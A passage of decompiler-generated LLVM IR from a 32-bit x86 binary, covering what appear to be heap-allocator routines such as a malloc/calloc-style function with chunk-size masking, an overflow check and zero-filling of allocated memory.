  %v1_80531b1 = call i32 @function_80538e9(i32 %v1_805319d)
  store i32 %v1_80531b1, i32* %eax.global-to-local, align 4
  %v0_80531b6 = load i32, i32* @ebx, align 4
  store i32 %v0_80531b6, i32* @global_var_8056ec4.223, align 4
  br label %dec_label_pc_80531bf

dec_label_pc_80531bf:                             ; preds = %dec_label_pc_8053171, %dec_label_pc_8053156, %dec_label_pc_8053151, %dec_label_pc_8053080, %dec_label_pc_8053198
  %v0_80531bf = load i32, i32* @global_var_8056ee8.219, align 8
  store i32 %v0_80531bf, i32* %eax.global-to-local, align 4
  %v1_80531c4 = load i32, i32* @global_var_8056eec.224, align 4
  %tmp133 = icmp ugt i32 %v0_80531bf, %v1_80531c4
  br i1 %tmp133, label %dec_label_pc_80531cc, label %dec_label_pc_80531d1

dec_label_pc_80531cc:                             ; preds = %dec_label_pc_80531bf
  store i32 %v0_80531bf, i32* @global_var_8056eec.224, align 4
  br label %dec_label_pc_80531d1

dec_label_pc_80531d1:                             ; preds = %dec_label_pc_80531bf, %dec_label_pc_80531cc
  %v1_80531d1 = load i32, i32* @global_var_8056ee4.217, align 4
  %v2_80531d1 = add i32 %v1_80531d1, %v0_80531bf
  store i32 %v2_80531d1, i32* %eax.global-to-local, align 4
  %v1_80531d7 = load i32, i32* @global_var_8056ef4.220, align 4
  %tmp134 = icmp ugt i32 %v2_80531d1, %v1_80531d7
  br i1 %tmp134, label %dec_label_pc_80531df, label %dec_label_pc_80531e4

dec_label_pc_80531df:                             ; preds = %dec_label_pc_80531d1
  store i32 %v2_80531d1, i32* @global_var_8056ef4.220, align 4
  br label %dec_label_pc_80531e4

dec_label_pc_80531e4:                             ; preds = %dec_label_pc_80531d1, %dec_label_pc_80531df
  %v0_80531e4 = load i32, i32* @global_var_8056bac.207, align 4
  store i32 %v0_80531e4, i32* @ebx, align 4
  %v1_80531ea = add i32 %v0_80531e4, 4
  %v2_80531ea = inttoptr i32 %v1_80531ea to i32*
  %v3_80531ea = load i32, i32* %v2_80531ea, align 4
  %v1_80531ed = and i32 %v3_80531ea, -4
  store i32 %v1_80531ed, i32* %ecx.global-to-local, align 4
  %v10_80531f0 = icmp ult i32 %v1_80531ed, %v1_8052e8d
  br i1 %v10_80531f0, label %dec_label_pc_8053270, label %dec_label_pc_80531f6

dec_label_pc_80531f6:                             ; preds = %dec_label_pc_80531e4
  store i32 %v1_8052f18, i32* %esi.global-to-local, align 4
  %v2_80531fc = sub i32 %v1_80531ed, %v1_8052f18
  store i32 %v2_80531fc, i32* %ecx.global-to-local, align 4
  %v2_80531fe = add i32 %v0_80531e4, %v1_8052f18
  store i32 %v2_80531fe, i32* @edx, align 4
  %v1_8053201 = or i32 %v1_8052f18, 1
  store i32 %v1_8053201, i32* %eax.global-to-local, align 4
  store i32 %v2_80531fe, i32* @global_var_8056bac.207, align 4
  store i32 %v1_8053201, i32* %v2_80531ea, align 4
  %v0_805320d.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_805320d

dec_label_pc_805320d:                             ; preds = %dec_label_pc_8052e9e, %dec_label_pc_80531f6
  %v0_805320d = phi i32 [ %v5_8052eb1, %dec_label_pc_8052e9e ], [ %v0_805320d.pre, %dec_label_pc_80531f6 ]
  %v1_805320d = or i32 %v0_805320d, 1
  store i32 %v1_805320d, i32* %ecx.global-to-local, align 4
  %v0_8053210 = load i32, i32* @ebx, align 4
  %v1_8053210 = add i32 %v0_8053210, 8
  store i32 %v1_8053210, i32* %ebx.global-to-local, align 4
  %v1_8053213 = load i32, i32* @edx, align 4
  %v2_8053213 = add i32 %v1_8053213, 4
  %v3_8053213 = inttoptr i32 %v2_8053213 to i32*
  store i32 %v1_805320d, i32* %v3_8053213, align 4
  br label %dec_label_pc_805327d

dec_label_pc_8053218:                             ; preds = %dec_label_pc_8052c58
  %v5_805321e = sub i32 %v1_8052c3b, %v1_8052f18
  store i32 %v5_805321e, i32* %eax.global-to-local, align 4
  %v2_8053222 = add i32 %v1_805322f, %v1_8052f18
  store i32 %v2_8053222, i32* @edx, align 4
  %v1_8053226 = or i32 %v1_8052f18, 1
  store i32 %v2_8053222, i32* @global_var_8056bb0.208, align 16
  store i32 %v1_8053226, i32* %v2_8052c35, align 4
  %v0_8053232 = load i32, i32* %eax.global-to-local, align 4
  %v0_8053234 = load i32, i32* @edx, align 4
  store i32 %v0_8053234, i32* @global_var_8056bbc.225, align 4
  %v1_805323a = or i32 %v0_8053232, 1
  store i32 %v1_805323a, i32* %ecx.global-to-local, align 4
  store i32 %v0_8053234, i32* @global_var_8056bc0.210, align 64
  %v1_8053243 = add i32 %v0_8053234, 8
  %v2_8053243 = inttoptr i32 %v1_8053243 to i32*
  store i32 ptrtoint (i32* @global_var_8056bb4.209 to i32), i32* %v2_8053243, align 4
  %v0_805324a = load i32, i32* @edx, align 4
  %v1_805324a = add i32 %v0_805324a, 12
  %v2_805324a = inttoptr i32 %v1_805324a to i32*
  store i32 ptrtoint (i32* @global_var_8056bb4.209 to i32), i32* %v2_805324a, align 4
  %v0_8053251 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8053251 = load i32, i32* @edx, align 4
  %v2_8053251 = add i32 %v1_8053251, 4
  %v3_8053251 = inttoptr i32 %v2_8053251 to i32*
  store i32 %v0_8053251, i32* %v3_8053251, align 4
  %v0_8053254 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053254 = load i32, i32* @edx, align 4
  %v3_8053254 = add i32 %v1_8053254, %v0_8053254
  %v4_8053254 = inttoptr i32 %v3_8053254 to i32*
  store i32 %v0_8053254, i32* %v4_8053254, align 4
  br label %dec_label_pc_8053262

dec_label_pc_8053259:                             ; preds = %dec_label_pc_8052c67
  store i32 %v1_8052f18, i32* %ebx.global-to-local, align 4
  %v0_805325d = load i32, i32* @ebp, align 4
  %v2_805325d = or i32 %v1_8052f18, 4
  %v3_805325d = add i32 %v0_805325d, %v2_805325d
  %v4_805325d = inttoptr i32 %v3_805325d to i32*
  %v5_805325d = load i32, i32* %v4_805325d, align 4
  %v6_805325d = or i32 %v5_805325d, 1
  store i32 %v6_805325d, i32* %v4_805325d, align 4
  br label %dec_label_pc_8053262

dec_label_pc_8053262:                             ; preds = %dec_label_pc_8053218, %dec_label_pc_8053259
  %v0_8053262 = load i32, i32* @ebp, align 4
  %v1_8053262 = add i32 %v0_8053262, 8
  store i32 %v1_8053262, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805327d

dec_label_pc_8053267:                             ; preds = %dec_label_pc_8052d57
  %v1_8053267 = load i32, i32* @ebx, align 4
  %v2_8053267 = add i32 %v0_8052d66, 4
  %v3_8053267 = add i32 %v2_8053267, %v1_8053267
  %v4_8053267 = inttoptr i32 %v3_8053267 to i32*
  %v5_8053267 = load i32, i32* %v4_8053267, align 4
  %v6_8053267 = or i32 %v5_8053267, 1
  store i32 %v6_8053267, i32* %v4_8053267, align 4
  br label %dec_label_pc_805326c

dec_label_pc_805326c:                             ; preds = %dec_label_pc_8052d6f, %dec_label_pc_8053267
  %v0_805326c = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v0_805326c, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805327d

dec_label_pc_8053270:                             ; preds = %dec_label_pc_805302e, %dec_label_pc_80531e4, %dec_label_pc_8053038
  %v0_8053270 = load i32, i32* %stack_var_-92, align 4
  %v1_8053270 = call i32 @function_80526c9(i32 %v0_8053270)
  store i32 %v1_8053270, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_8053277 = inttoptr i32 %v1_8053270 to i32*
  store i32 12, i32* %v1_8053277, align 4
  br label %dec_label_pc_805327d

dec_label_pc_805327d:                             ; preds = %dec_label_pc_805326c, %dec_label_pc_8053262, %dec_label_pc_805320d, %dec_label_pc_8052ec9, %dec_label_pc_8052e7b, %dec_label_pc_8052c02, %dec_label_pc_8053270
  store i32 %v2_8052b39, i32* @eax, align 4
  store i32 %v2_8052b39, i32* %stack_var_-92, align 4
  %v2_8053286 = call i32 @function_8054050(i32 %v2_8052b39, i32 1)
  store i32 %v2_8053286, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805328e

dec_label_pc_805328e:                             ; preds = %dec_label_pc_8052b57, %dec_label_pc_805327d
  %v0_8053291 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8053291, i32* %eax.global-to-local, align 4
  store i32 %v0_8052b26, i32* @esi, align 4
  store i32 %v0_8052b25, i32* @edi, align 4
  store i32 %v0_8052b24, i32* @ebp, align 4
  ret i32 %v0_8053291

; uselistorder directives
  uselistorder i32 %v0_8053254, { 1, 0 }
  uselistorder i32 %v0_8053234, { 1, 0, 2 }
  uselistorder i32 %v2_80531d1, { 1, 0, 2 }
  uselistorder i32 %v0_80531bf, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8053156, { 1, 0 }
  uselistorder i32 %v2_8053144, { 1, 0 }
  uselistorder i32 %v1_80530fb, { 1, 3, 0, 2, 4 }
  uselistorder i32 %v2_80530e5, { 1, 0, 2 }
  uselistorder i32 %v2_80530d9, { 1, 2, 0 }
  uselistorder i32 %v2_80530d4, { 1, 0, 2 }
  uselistorder i32 %v1_80530c4, { 2, 1, 0 }
  uselistorder i8 %v0_8053092, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_8053075, { 1, 0, 2 }
  uselistorder i32 %v0_805312993, { 2, 0, 1 }
  uselistorder i32 %v0_805313794, { 3, 4, 1, 2, 5, 0, 7, 6 }
  uselistorder i32 %v1_805306f, { 2, 1, 0 }
  uselistorder i32 %v8_8053045, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_8053042, { 1, 0 }
  uselistorder i32 %v0_8053021, { 1, 0 }
  uselistorder i32 %v2_8052ff2, { 1, 0, 2, 3 }
  uselistorder i32 %v1_8052fea, { 0, 1, 4, 2, 3 }
  uselistorder i8 %v0_8052fd7, { 1, 0 }
  uselistorder i1 %v2_8052fce, { 2, 1, 0 }
  uselistorder i32 %v1_8052fce, { 5, 0, 1, 2, 3, 4, 6, 7 }
  uselistorder i32 %v0_8052fbb, { 3, 4, 0, 2, 1 }
  uselistorder i32 %v2_8052f9f, { 1, 0, 2 }
  uselistorder i32 %v2_8052f8b, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v2_8052f54, { 1, 2, 0, 3 }
  uselistorder i32 %v1_8052f48, { 2, 1, 0 }
  uselistorder i32 %v8_8052f37, { 3, 1, 0, 2, 4, 5 }
  uselistorder i32 %v2_8052f1e, { 1, 0, 2 }
  uselistorder i32 %v0_8052eba, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_8052e8d, { 2, 0, 1, 3 }
  uselistorder i32 %v0_8052e83, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v0_8052e75, { 1, 0 }
  uselistorder i32 %v1_8052e0c, { 1, 0 }
  uselistorder i32 %v3_8052e00, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_8052e10, { 1, 0 }
  uselistorder i32 %v2_8052dfa, { 3, 2, 1, 0 }
  uselistorder i32 %esi.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_8052df77, { 1, 0 }
  uselistorder i32 %v2_8052dec, { 1, 0 }
  uselistorder i32 %v1_8052dd0, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_8052dcc, { 2, 1, 0 }
  uselistorder i32 %v1_8052dc8, { 1, 0 }
  uselistorder i32 %v1_8052dbc, { 2, 1, 0 }
  uselistorder i32 %v2_8052db2, { 1, 0 }
  uselistorder i32 %v1_8052daf, { 1, 2, 0 }
  uselistorder i32 %v4_8052d4d, { 3, 6, 4, 5, 2, 1, 0 }
  uselistorder i32 %v0_8052d98, { 1, 0 }
  uselistorder i32 %v0_8052d66, { 1, 2, 0, 3 }
  uselistorder i32 %v3_8052d39, { 2, 0, 1, 3 }
  uselistorder i32 %v0_8052d06, { 0, 2, 1 }
  uselistorder i32 %v2_8052cea, { 1, 0 }
  uselistorder i32 %v1_8052ce0, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-64.1, { 1, 0 }
  uselistorder i32 %v0_8052cdb.lcssa, { 1, 0 }
  uselistorder i32 %v3_8052ccb, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v1_8052cc2, { 1, 0, 2 }
  uselistorder i32 %v2_8052c9e, { 2, 0, 1, 3 }
  uselistorder i32 %v2_8052c86, { 2, 1, 0 }
  uselistorder i32 %v0_8052c72, { 2, 0, 3, 1 }
  uselistorder i32 %v3_8052c38, { 1, 0, 2 }
  uselistorder i32 %v1_805322f, { 0, 1, 3, 2 }
  uselistorder i32 %v0_8052d069, { 1, 0, 2 }
  uselistorder i32 %v3_8052be5, { 1, 0, 2 }
  uselistorder i32 %v2_8052bd7, { 2, 1, 0 }
  uselistorder i32 %v2_8052bb2, { 2, 1, 0 }
  uselistorder i8 %v0_8052b80, { 3, 1, 2, 0, 4 }
  uselistorder i32 %v1_8052f18, { 13, 31, 12, 2, 29, 11, 3, 22, 21, 10, 9, 4, 24, 23, 20, 18, 19, 5, 25, 26, 6, 27, 28, 15, 7, 16, 17, 8, 30, 14, 0, 32, 34, 33, 1, 35 }
  uselistorder i32 %v1_8052b69, { 0, 2, 1 }
  uselistorder i32 %v0_8052b52, { 1, 0 }
  uselistorder i32 %v2_8052b39, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-92, { 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0, 14, 15 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32* %ecx.global-to-local, { 23, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 25, 26, 27, 28, 29, 30 }
  uselistorder i32* %ebx.global-to-local, { 21, 1, 2, 3, 4, 5, 6, 7, 8, 12, 9, 0, 10, 11, 13, 14, 15, 16, 17, 18, 19, 20, 22, 23, 24 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 55, 50, 51, 54, 53, 52, 56, 57, 58, 59, 60, 62, 61, 63, 64, 65, 66, 67, 68, 69, 70, 0, 71, 72, 73 }
  uselistorder i32 1048576, { 1, 2, 0 }
  uselistorder i8* @global_var_8056ee0.222, { 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32)* @function_8054368, { 1, 0 }
  uselistorder i32 134572980, { 0, 3, 1, 2 }
  uselistorder i32* @global_var_8056bc0.210, { 1, 2, 3, 0 }
  uselistorder i32 ()* @function_8052afe, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_8056bac.207 to i32), i32 12), { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_8056bac.207 to i32), { 2, 3, 4, 0, 5, 1, 6 }
  uselistorder label %dec_label_pc_805328e, { 1, 0 }
  uselistorder label %dec_label_pc_805327d, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_8053270, { 1, 2, 0 }
  uselistorder label %dec_label_pc_805326c, { 1, 0 }
  uselistorder label %dec_label_pc_8053262, { 1, 0 }
  uselistorder label %dec_label_pc_805320d, { 1, 0 }
  uselistorder label %dec_label_pc_80531e4, { 1, 0 }
  uselistorder label %dec_label_pc_80531d1, { 1, 0 }
  uselistorder label %dec_label_pc_80531bf, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8053151, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805314c, { 1, 0 }
  uselistorder label %dec_label_pc_8053130, { 1, 0 }
  uselistorder label %dec_label_pc_80530d9, { 1, 0 }
  uselistorder label %dec_label_pc_80530c2, { 1, 0 }
  uselistorder label %dec_label_pc_80530ab, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_805302e, { 1, 0 }
  uselistorder label %dec_label_pc_8053021, { 1, 0 }
  uselistorder label %dec_label_pc_8052fe2, { 1, 0 }
  uselistorder label %dec_label_pc_8052fbb, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8052f9f, { 1, 0 }
  uselistorder label %dec_label_pc_8052f86, { 1, 0 }
  uselistorder label %dec_label_pc_8052f68, { 1, 0 }
  uselistorder label %dec_label_pc_8052e83, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8052e7b, { 1, 0 }
  uselistorder label %dec_label_pc_8052e64, { 1, 0 }
  uselistorder label %dec_label_pc_8052df7, { 1, 0 }
  uselistorder label %dec_label_pc_8052dfc.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8052dd0, { 1, 0 }
  uselistorder label %.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8052d57, { 1, 0 }
  uselistorder label %dec_label_pc_8052d06, { 1, 0 }
  uselistorder label %dec_label_pc_8052cde, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_8052cc7, { 1, 0 }
  uselistorder label %dec_label_pc_8052c35, { 1, 0 }
  uselistorder label %dec_label_pc_8052d06.preheader, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8052c02, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_8052b80, { 1, 0 }
}

define i32 @function_8053298(i64 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8053298:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_8053298 = load i32, i32* @edi, align 4
  %v0_805329a = load i32, i32* @ebx, align 4
  %v12_805329b = ptrtoint i32* %stack_var_-28 to i32
  %v4_805329e = trunc i64 %arg1 to i32
  store i32 %v4_805329e, i32* @edx, align 4
  %sext = mul i64 %arg1, 4294967296
  %v2_80532a8 = sdiv i64 %sext, 4294967296
  %v3_80532a8 = sext i32 %arg2 to i64
  %v4_80532a8 = mul nsw i64 %v3_80532a8, %v2_80532a8
  %v5_80532a8 = trunc i64 %v4_80532a8 to i32
  store i32 %v5_80532a8, i32* @ebx, align 4
  %v2_80532ab = icmp eq i32 %v4_805329e, 0
  br i1 %v2_80532ab, label %dec_label_pc_80532cd, label %dec_label_pc_80532af

dec_label_pc_80532af:                             ; preds = %dec_label_pc_8053298
  store i32 %v4_805329e, i32* @edi, align 4
  %div = udiv i32 %v5_80532a8, %v4_805329e
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp14 = urem i32 %v5_80532a8, %v4_805329e
  store i32 %tmp14, i32* @edx, align 4
  %v12_80532b7 = icmp eq i32 %div, %arg2
  br i1 %v12_80532b7, label %dec_label_pc_80532cd, label %dec_label_pc_80532bb

dec_label_pc_80532bb:                             ; preds = %dec_label_pc_80532af
  %v1_80532bb = call i32 @function_80526c9(i32 %v0_805329a)
  store i32 %v1_80532bb, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_80532c2 = inttoptr i32 %v1_80532bb to i32*
  store i32 12, i32* %v1_80532c2, align 4
  br label %dec_label_pc_8053383

dec_label_pc_80532cd:                             ; preds = %dec_label_pc_80532af, %dec_label_pc_8053298
  store i32 %v12_805329b, i32* @eax, align 4
  %v2_80532dd = call i32 @function_8054050(i32 %v12_805329b, i32 134561869)
  store i32 %v2_80532dd, i32* %eax.global-to-local, align 4
  %v1_80532e9 = call i32 @function_805404d(i32 ptrtoint (i32* @global_var_80567e0.205 to i32))
  store i32 %v1_80532e9, i32* %eax.global-to-local, align 4
  %v0_80532ee = load i32, i32* @ebx, align 4
  %v1_80532f1 = call i32 @function_8052b24(i32 %v0_80532ee)
  store i32 %v1_80532f1, i32* %eax.global-to-local, align 4
  store i32 %v1_80532f1, i32* %ebx.global-to-local, align 4
  %v1_80532fb = icmp eq i32 %v1_80532f1, 0
  br i1 %v1_80532fb, label %dec_label_pc_8053372, label %dec_label_pc_80532ff

dec_label_pc_80532ff:                             ; preds = %dec_label_pc_80532cd
  %v1_80532ff = add i32 %v1_80532f1, -4
  %v2_80532ff = inttoptr i32 %v1_80532ff to i32*
  %v3_80532ff = load i32, i32* %v2_80532ff, align 4
  store i32 %v3_80532ff, i32* %eax.global-to-local, align 4
  %v2_8053302 = and i32 %v3_80532ff, 2
  %v3_8053302 = icmp eq i32 %v2_8053302, 0
  %v1_8053304 = icmp eq i1 %v3_8053302, false
  br i1 %v1_8053304, label %dec_label_pc_8053372, label %dec_label_pc_8053306

dec_label_pc_8053306:                             ; preds = %dec_label_pc_80532ff
  %v1_80533063 = add i32 %v3_80532ff, -4
  %v1_8053309 = and i32 %v1_80533063, -4
  store i32 %v1_8053309, i32* @edx, align 4
  %v2_805330e = udiv i32 %v1_8053309, 4
  store i32 %v2_805330e, i32* %eax.global-to-local, align 4
  %v5_8053311 = icmp ult i32 %v1_8053309, 36
  %tmp = and i32 %v1_80533063, -4
  %tmp18 = icmp eq i32 %tmp, 36
  %v2_8053314 = or i1 %v5_8053311, %tmp18
  br i1 %v2_8053314, label %dec_label_pc_8053325, label %dec_label_pc_8053316

dec_label_pc_8053316:                             ; preds = %dec_label_pc_8053306
  %v3_805331b = inttoptr i32 %v1_80532f1 to i8*
  %v4_805331b = call i32 @function_805271a(i8* %v3_805331b, i32 0, i32 %v1_8053309)
  store i32 %v4_805331b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053372

dec_label_pc_8053325:                             ; preds = %dec_label_pc_8053306
  %v1_8053325 = inttoptr i32 %v1_80532f1 to i32*
  store i32 0, i32* %v1_8053325, align 4
  %v0_805332b = load i32, i32* %ebx.global-to-local, align 4
  %v1_805332b = add i32 %v0_805332b, 4
  %v2_805332b = inttoptr i32 %v1_805332b to i32*
  store i32 0, i32* %v2_805332b, align 4
  %v0_8053332 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053332 = add i32 %v0_8053332, 8
  %v2_8053332 = inttoptr i32 %v1_8053332 to i32*
  store i32 0, i32* %v2_8053332, align 4
  %v0_8053339 = load i32, i32* %eax.global-to-local, align 4
  %tmp15 = icmp ult i32 %v0_8053339, 5
  br i1 %tmp15, label %dec_label_pc_8053372, label %dec_label_pc_805333e

dec_label_pc_805333e:                             ; preds = %dec_label_pc_8053325
  %v0_805333e = load i32, i32* %ebx.global-to-local, align 4
  %v1_805333e = add i32 %v0_805333e, 12
  %v2_805333e = inttoptr i32 %v1_805333e to i32*
  store i32 0, i32* %v2_805333e, align 4
  %v0_8053345 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053345 = add i32 %v0_8053345, 16
  %v2_8053345 = inttoptr i32 %v1_8053345 to i32*
  store i32 0, i32* %v2_8053345, align 4
  %v0_805334c = load i32, i32* %eax.global-to-local, align 4
  %tmp16 = icmp ult i32 %v0_805334c, 7
  br i1 %tmp16, label %dec_label_pc_8053372, label %dec_label_pc_8053351

dec_label_pc_8053351:                             ; preds = %dec_label_pc_805333e
  %v0_8053351 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053351 = add i32 %v0_8053351, 20
  %v2_8053351 = inttoptr i32 %v1_8053351 to i32*
  store i32 0, i32* %v2_8053351, align 4
  %v0_8053358 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053358 = add i32 %v0_8053358, 24
  %v2_8053358 = inttoptr i32 %v1_8053358 to i32*
  store i32 0, i32* %v2_8053358, align 4
  %v0_805335f = load i32, i32* %eax.global-to-local, align 4
  %tmp17 = icmp ult i32 %v0_805335f, 9
  br i1 %tmp17, label %dec_label_pc_8053372, label %dec_label_pc_8053364

dec_label_pc_8053364:                             ; preds = %dec_label_pc_8053351
  %v0_8053364 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053364 = add i32 %v0_8053364, 28
  %v2_8053364 = inttoptr i32 %v1_8053364 to i32*
  store i32 0, i32* %v2_8053364, align 4
  %v0_805336b = load i32, i32* %ebx.global-to-local, align 4
  %v1_805336b = add i32 %v0_805336b, 32
  %v2_805336b = inttoptr i32 %v1_805336b to i32*
  store i32 0, i32* %v2_805336b, align 4
  br label %dec_label_pc_8053372

dec_label_pc_8053372:                             ; preds = %dec_label_pc_8053351, %dec_label_pc_805333e, %dec_label_pc_8053325, %dec_label_pc_80532ff, %dec_label_pc_80532cd, %dec_label_pc_8053316, %dec_label_pc_8053364
  store i32 %v12_805329b, i32* @eax, align 4
  %v2_805337b = call i32 @function_8054050(i32 %v12_805329b, i32 1)
  store i32 %v2_805337b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053383

dec_label_pc_8053383:                             ; preds = %dec_label_pc_80532bb, %dec_label_pc_8053372
  %v0_8053386 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8053386, i32* %eax.global-to-local, align 4
  store i32 %v0_805329a, i32* @ebx, align 4
  store i32 %v0_8053298, i32* @edi, align 4
  ret i32 %v0_8053386

; uselistorder directives
  uselistorder i32 %v1_8053309, { 3, 2, 0, 1 }
  uselistorder i32 %v1_80532f1, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v5_80532a8, { 1, 0, 2 }
  uselistorder i32 %v4_805329e, { 1, 0, 2, 3, 4 }
  uselistorder i32* %ebx.global-to-local, { 9, 0, 3, 1, 6, 2, 7, 4, 5, 8, 10 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 3, 4, 5, 2, 6, 7, 9, 10, 11, 8, 12 }
  uselistorder i64 4294967296, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_8053383, { 1, 0 }
  uselistorder label %dec_label_pc_8053372, { 6, 0, 1, 2, 5, 3, 4 }
}

define i32 @function_805338c() local_unnamed_addr {
dec_label_pc_805338c:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_805338c = load i32, i32* @ebp, align 4
  %v0_805338d = load i32, i32* @edi, align 4
  %v0_805338e = load i32, i32* @esi, align 4
  %v0_805338f = load i32, i32* @ebx, align 4
  store i32 %tmp7, i32* @ebx, align 4
  %v4_8053397 = icmp eq i32 %tmp6, 0
  %v1_805339c = icmp eq i1 %v4_8053397, false
  br i1 %v1_805339c, label %dec_label_pc_80533ae, label %dec_label_pc_805339e

dec_label_pc_805339e:                             ; preds = %dec_label_pc_805338c
  store i32 %tmp7, i32* %stack_var_-60, align 4
  %v1_80533a2 = call i32 @function_8052b24(i32 %tmp7)
  store i32 %v1_80533a2, i32* %eax.global-to-local, align 4
  store i32 %v1_80533a2, i32* @ebx, align 4
  br label %dec_label_pc_80536a7

dec_label_pc_80533ae:                             ; preds = %dec_label_pc_805338c
  %v1_80533ae = icmp eq i32 %tmp7, 0
  %v1_80533b0 = icmp eq i1 %v1_80533ae, false
  br i1 %v1_80533b0, label %dec_label_pc_80533c3, label %dec_label_pc_80533b2

dec_label_pc_80533b2:                             ; preds = %dec_label_pc_80533ae
  store i32 %tmp6, i32* %stack_var_-60, align 4
  %v1_80533b9 = call i32 @function_80538e9(i32 %tmp6)
  store i32 %v1_80533b9, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80536a7

dec_label_pc_80533c3:                             ; preds = %dec_label_pc_80533ae
  %v2_80533ce = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_80533ce, i32* @eax, align 4
  store i32 %v2_80533ce, i32* %stack_var_-60, align 4
  %v2_80533d3 = call i32 @function_8054050(i32 %v2_80533ce, i32 134561869)
  store i32 %v2_80533d3, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_80567e0.205 to i32), i32* %stack_var_-60, align 4
  %v1_80533df = call i32 @function_805404d(i32 ptrtoint (i32* @global_var_80567e0.205 to i32))
  store i32 %v1_80533df, i32* %eax.global-to-local, align 4
  %v0_80533e7 = load i32, i32* @ebx, align 4
  %tmp19 = icmp ult i32 %v0_80533e7, -32
  br i1 %tmp19, label %dec_label_pc_80533fe, label %dec_label_pc_80533ec

dec_label_pc_80533ec:                             ; preds = %dec_label_pc_80533c3
  %v0_80533ec = load i32, i32* %stack_var_-60, align 4
  %v1_80533ec = call i32 @function_80526c9(i32 %v0_80533ec)
  store i32 %v1_80533ec, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_80533f3 = inttoptr i32 %v1_80533ec to i32*
  store i32 12, i32* %v1_80533f3, align 4
  br label %dec_label_pc_80536aa

dec_label_pc_80533fe:                             ; preds = %dec_label_pc_80533c3
  %v1_80533fe = add i32 %v0_80533e7, 11
  %tmp20 = icmp ult i32 %v1_80533fe, 16
  br i1 %tmp20, label %dec_label_pc_8053415, label %dec_label_pc_805340e

dec_label_pc_805340e:                             ; preds = %dec_label_pc_80533fe
  %v1_805340e = and i32 %v1_80533fe, -8
  br label %dec_label_pc_8053415

dec_label_pc_8053415:                             ; preds = %dec_label_pc_80533fe, %dec_label_pc_805340e
  %stack_var_-40.0 = phi i32 [ %v1_805340e, %dec_label_pc_805340e ], [ 16, %dec_label_pc_80533fe ]
  %storemerge26 = phi i32 [ %v1_805340e, %dec_label_pc_805340e ], [ %v1_80533fe, %dec_label_pc_80533fe ]
  store i32 %storemerge26, i32* %eax.global-to-local, align 4
  %v1_8053419 = add i32 %tmp6, -8
